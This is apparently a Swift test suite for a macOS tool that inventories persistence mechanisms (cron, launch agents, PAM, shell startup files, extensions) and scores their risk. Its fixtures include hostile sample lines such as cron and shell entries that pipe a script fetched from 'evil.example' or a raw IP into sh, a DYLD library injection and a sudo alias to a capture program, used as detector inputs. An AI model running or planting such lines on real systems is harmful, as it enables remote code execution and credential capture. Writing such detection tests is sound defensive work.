import Foundation
import Testing
@testable import MacCleanerKit

@Suite("Launch items inventory: parsers and risk")
struct PersistenceInventoryTests {
    @Test func crontab() {
        let text = """
        # comment
        MAILTO=""
        SHELL=/bin/bash
        */5 * * * * /usr/local/bin/backup.sh --quiet
        @reboot curl -fsSL http://evil.example/x.sh | sh

        """
        let entries = CrontabParser.parse(text)
        #expect(entries.count == 2)
        #expect(entries[0] == CrontabEntry(schedule: "*/5 * * * *", command: "/usr/local/bin/backup.sh --quiet"))
        #expect(entries[1].schedule == "@reboot")
        #expect(!ThreatCommandAnalyzer.analyze(entries[1].command).isEmpty)

        let system = CrontabParser.parse("0 3 * * * root /usr/sbin/periodic daily", systemWide: true)
        #expect(system == [CrontabEntry(schedule: "0 3 * * *", command: "/usr/sbin/periodic daily")])
    }

    @Test func launchctlOverridesAndServices() {
        let disabled = """
        disabled services = {
        \t\t"com.apple.ManagedClientAgent.enrollagent" => disabled
        \t\t"com.bjango.istatmenus.status" => enabled
        \t\t"org.old.style" => true
        }
        """
        let overrides = LaunchctlParser.disabledOverrides(disabled)
        #expect(overrides["com.apple.ManagedClientAgent.enrollagent"] == true)
        #expect(overrides["com.bjango.istatmenus.status"] == false)
        #expect(overrides["org.old.style"] == true)

        let print = """
        gui/501 = {
        \ttype = login
        \tservices = {
        \t\t       0      0 \tcom.apple.mbfloagent
        \t\t   52737   (pe) \tcom.apple.syncdefaultsd
        \t\t    1272      - \tcom.google.keystone.agent
        \t}
        }
        """
        let services = LaunchctlParser.services(print)
        #expect(services["com.apple.mbfloagent"] == false)
        #expect(services["com.apple.syncdefaultsd"] == true)
        #expect(services["com.google.keystone.agent"] == true)
    }

    @Test func pluginkit() {
        let text = """
        +    com.aone.keka.KekaFinderIntegration(1.2.53)
        \t            Path = /Applications/Keka.app/Contents/PlugIns/KekaFinderIntegration.appex
        \t            UUID = 2BC7CFED-B280-5171-B9C6-272AA8F46CAD
        \t             SDK = com.apple.FinderSync
        \t    Display Name = Keka Finder Integration

             com.apple.mail.SpotlightIndexExtension(16.0)
        \t            Path = /System/Applications/Mail.app/Contents/PlugIns/x.appex
        \t             SDK = com.apple.spotlight.index
        -    org.example.share(2.0)
        \t            Path = /Applications/Example.app/Contents/PlugIns/Share.appex
         (3 plug-ins)
        """
        let entries = PersistencePluginKitParser.parse(text)
        #expect(entries.count == 3)
        #expect(entries[0].identifier == "com.aone.keka.KekaFinderIntegration")
        #expect(entries[0].version == "1.2.53")
        #expect(entries[0].sdk == "com.apple.FinderSync")
        #expect(entries[0].enabled == true)
        #expect(entries[0].displayName == "Keka Finder Integration")
        #expect(entries[1].enabled == nil)
        #expect(PersistencePluginKitParser.isSystemPath(entries[1].path))
        #expect(entries[2].enabled == false)
    }

    @Test func systemExtensions() {
        let text = """
        5 extension(s)
        --- com.apple.system_extension.network_extension (Go to 'System Settings > General > Login Items & Extensions > Network Extensions' to modify these system extension(s))
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        *\t*\t6JQLCT6DRB\tcom.radiosilenceapp.client.NetworkExtension (1.1/1.1)\tNetworkExtension\t[activated enabled]
        \t*\t6H4HRTU5E3\tcom.avast.Antivirus.SystemExtension (8.1.217/8.1.217)\tAvast Antivirus System Extension\t[activated disabled]
        --- com.apple.system_extension.endpoint_security
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        *\t*\tW5W395V82Y\tcom.nordvpn.macos.Shield (1.4.2/62)\tNordVPN Threat Protection\t[activated enabled]
        """
        let entries = SystemExtensionsParser.parse(text)
        #expect(entries.count == 3)
        #expect(entries[0].bundleID == "com.radiosilenceapp.client.NetworkExtension")
        #expect(entries[0].version == "1.1/1.1")
        #expect(entries[0].enabled && entries[0].active)
        #expect(entries[0].category == "network_extension")
        #expect(!entries[1].enabled)
        #expect(entries[1].state == "activated disabled")
        #expect(entries[2].category == "endpoint_security")
        #expect(entries[2].name == "NordVPN Threat Protection")
    }

    @Test func pam() {
        let shipped: Set<String> = ["pam_tid.so.2", "pam_opendirectory.so.2", "pam_permit.so.2", "pam_smartcard.so.2"]
        let text = """
        # sudo: auth account password session
        auth       include        sudo_local
        auth       optional       /opt/homebrew/lib/pam/pam_reattach.so
        auth       sufficient     pam_tid.so
        auth       sufficient     pam_evil.so
        auth       required       pam_opendirectory.so
        account    required       pam_permit.so
        """
        #expect(PAMParser.thirdPartyModules(text, shipped: shipped) == ["/opt/homebrew/lib/pam/pam_reattach.so", "pam_evil.so"])
    }

    @Test func dyldAndFacts() {
        let plist: [String: Any] = [
            "Label": "x", "RunAtLoad": true, "KeepAlive": ["SuccessfulExit": false],
            "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/tmp/libhook.dylib", "PATH": "/usr/bin"],
        ]
        #expect(LaunchPlistInspector.injectedLibraries(plist) == ["DYLD_INSERT_LIBRARIES=/tmp/libhook.dylib"])
        #expect(LaunchPlistInspector.facts(plist).count == 2)
        #expect(LaunchPlistInspector.injectedLibraries(["LSEnvironment": ["FOO": "1"]]).isEmpty)
    }

    @Test func shellStartupFlagsOnlyDangerousLinesAndMasksSecrets() {
        let text = """
        export PATH="/opt/homebrew/bin:$PATH"
        eval "$(/opt/homebrew/bin/brew shellenv)"
        export OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz0123456789
        curl -fsSL http://198.51.100.7/a.sh | bash
        export DYLD_INSERT_LIBRARIES=/Users/Shared/.lib/hook.dylib
        alias sudo='~/.x/capture'
        """
        let flags = ShellStartupAudit.flaggedLines(text)
        #expect(flags.map(\.lineNumber) == [4, 5, 6])
        #expect(flags[1].severity == .high)
        #expect(flags[2].severity == .medium)
        #expect(!flags.contains { $0.snippet.contains("sk-proj-abcdefghijklmnop") })
    }

    @Test func loginHooks() {
        let hooks = LoginHookParser.hooks(["LoginHook": "/usr/local/bin/hook.sh", "LogoutHook": " ", "Other": 1])
        #expect(hooks.count == 1)
        #expect(hooks[0].kind == "LoginHook")
    }

    @Test func profiles() {
        let text = """
        _computerlevel[1] attribute: profileIdentifier: com.example.wifi
        _computerlevel[1] attribute: profileUUID: 1234
        alice[1] attribute: profileIdentifier: com.adware.search
        There are 2 configuration profiles installed
        """
        let list = ProfilesParser.profiles(text)
        #expect(list.map(\.identifier) == ["com.example.wifi", "com.adware.search"])
        #expect(list.map(\.scope) == ["_computerlevel", "alice"])
    }

    @Test func teamNameFromCertificate() {
        #expect(PersistenceSignature.teamName(fromCertificateSummary: "Developer ID Application: Google LLC (EQHXZ8M8AV)") == "Google LLC")
        #expect(PersistenceSignature.teamName(fromCertificateSummary: "Apple Development: dev@example.com (ABCDE12345)") == "dev@example.com")
        #expect(PersistenceSignature.teamName(fromCertificateSummary: "Software Signing") == "Software Signing")
    }

    @Test func btmArchiveRoundTrip() throws {
        // A keyed archive with the same shape as BackgroundItems-v*.btm:
        // records nested in containers, a developer group record, NSURLs.
        let record: NSDictionary = [
            "identifier": "8.com.example.agent", "name": "Example Agent", "developerName": "Example Inc",
            "teamIdentifier": "ABCDE12345", "type": 8, "disposition": 11,
            "url": NSURL(string: "file:///Library/LaunchAgents/com.example.agent.plist")!,
            "executablePath": "/Applications/Example.app/Contents/MacOS/agent",
        ]
        let disabledApp: NSDictionary = [
            "identifier": "2.com.example.app", "name": "Example", "type": 2, "disposition": 10,
            "url": NSURL(string: "file:///Applications/Example.app/")!,
        ]
        let helper: NSDictionary = [
            "identifier": "4.com.example.helper", "name": "ExampleHelper", "type": 4, "disposition": 3,
            "url": NSURL(string: "Contents/Library/LoginItems/ExampleHelper.app", relativeTo: URL(string: "file:///"))!,
            "container": "2.com.example.parent",
        ]
        let siblingHelper: NSDictionary = [
            "identifier": "4.com.example.sibling", "type": 4, "disposition": 3,
            "url": NSURL(string: "Contents/Library/LoginItems/Sibling.app", relativeTo: nil)!,
        ]
        let parentApp: NSDictionary = [
            "identifier": "2.com.example.parent", "name": "Parent", "type": 2, "disposition": 3,
            "url": NSURL(string: "file:///Applications/Parent.app/")!, "items": ["4.com.example.sibling"],
        ]
        let group: NSDictionary = ["identifier": "32.Example Inc", "type": 32, "disposition": 3, "items": [record, disabledApp]]
        let root: NSDictionary = ["store": ["records": [group, record, parentApp, helper, siblingHelper]]]
        let data = try NSKeyedArchiver.archivedData(withRootObject: root, requiringSecureCoding: false)
        let records = BTMArchive.records(from: data)
        #expect(records.count == 5)
        #expect(records.first { $0.identifier == "4.com.example.sibling" }?.url == "/Applications/Parent.app/Contents/Library/LoginItems/Sibling.app")
        #expect(records.first { $0.identifier == "4.com.example.helper" }?.url == "/Applications/Parent.app/Contents/Library/LoginItems/ExampleHelper.app")
        let agent = try #require(records.first { $0.identifier == "8.com.example.agent" })
        #expect(agent.isAgent && agent.isEnabled)
        #expect(agent.url == "/Library/LaunchAgents/com.example.agent.plist")
        #expect(agent.developerName == "Example Inc")
        let app = try #require(records.first { $0.identifier == "2.com.example.app" })
        #expect(app.isApp && !app.isEnabled)
        #expect(app.url?.hasPrefix("/Applications/Example.app") == true)
    }

    @Test func riskAssessment() {
        let trusted = PersistenceSignature(kind: .developerID, teamID: "EQHXZ8M8AV", teamName: "Google LLC", notarized: true)
        #expect(PersistenceRiskAssessor.assess(.init(mechanism: .userLaunchAgents, signature: trusted)).risk == .safe)
        #expect(PersistenceRiskAssessor.assess(.init(mechanism: .userLaunchAgents, signature: .init(kind: .revoked))).risk == .suspicious)
        #expect(PersistenceRiskAssessor.assess(.init(mechanism: .userLaunchAgents, signature: .init(kind: .adHoc))).risk == .review)
        #expect(PersistenceRiskAssessor.assess(.init(mechanism: .rcScripts, signature: .init(kind: .notCode), unusualPresence: true)).risk == .review)
        #expect(PersistenceRiskAssessor.assess(.init(mechanism: .launchDaemons, signature: trusted, injectsLibraries: true)).risk == .suspicious)
        let high = ThreatFinding(rule: .remoteScriptToShell, severity: .high, snippet: "curl | sh")
        let result = PersistenceRiskAssessor.assess(.init(mechanism: .cron, signature: .init(kind: .notCode), findings: [high]))
        #expect(result.risk == .suspicious)
        #expect(!result.reasons.isEmpty)
    }

    @Test func snapshotDiff() {
        let a = PersistenceItem(id: "userLaunchAgents:/a.plist", mechanism: .userLaunchAgents, name: "A", program: "/bin/a")
        let b = PersistenceItem(id: "userLaunchAgents:/b.plist", mechanism: .userLaunchAgents, name: "B", program: "/bin/b")
        var bChanged = b
        bChanged.program = "/tmp/b"
        let c = PersistenceItem(id: "cron:x", mechanism: .cron, name: "C")
        let snapshot = PersistenceSnapshot(items: [a, b])
        let diff = snapshot.compare(with: [a, bChanged, c])
        #expect(diff.added.map(\.name) == ["B", "C"])
        #expect(diff.removed.map(\.program) == ["/bin/b"])
        #expect(snapshot.compare(with: [a, b]).isEmpty)
    }

    @Test func snapshotSaveLoad() throws {
        let url = FileManager.default.temporaryDirectory.appending(path: "persistence-snapshot-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: url) }
        let item = PersistenceItem(id: "x", mechanism: .launchDaemons, name: "X", signature: .init(kind: .apple), addedDate: Date(timeIntervalSince1970: 1000))
        try PersistenceSnapshot(date: Date(timeIntervalSince1970: 2000), items: [item]).save(to: url)
        let loaded = try #require(PersistenceSnapshot.load(from: url))
        #expect(loaded.items == [item])
    }

    @Test func privacyProtectedFolders() {
        let home = "/Users/t"
        #expect(PersistenceCollector.isPrivacyProtected("/Users/t/Documents/x/run.sh", home: home))
        #expect(PersistenceCollector.isPrivacyProtected("/Users/t/Library/Mobile Documents/com~apple~CloudDocs/a", home: home))
        #expect(PersistenceCollector.isPrivacyProtected("/Volumes/USB/x", home: home))
        #expect(!PersistenceCollector.isPrivacyProtected("/Users/t/.local/bin/x", home: home))
        #expect(!PersistenceCollector.isPrivacyProtected("/Users/t/Library/Application Support/Foo/x", home: home))
        #expect(!PersistenceCollector.isPrivacyProtected("/Applications/X.app", home: home))
    }

    @Test func appPaths() {
        #expect(PersistenceCollector.containingApp("/Applications/Zoom.app/Contents/PlugIns/x.appex") == "/Applications/Zoom.app")
        #expect(PersistenceCollector.appName(in: "/Applications/zoom.us.app/Contents/MacOS/zoom") == "zoom.us")
        #expect(PersistenceCollector.appName(in: "/usr/local/bin/tool") == nil)
    }
}
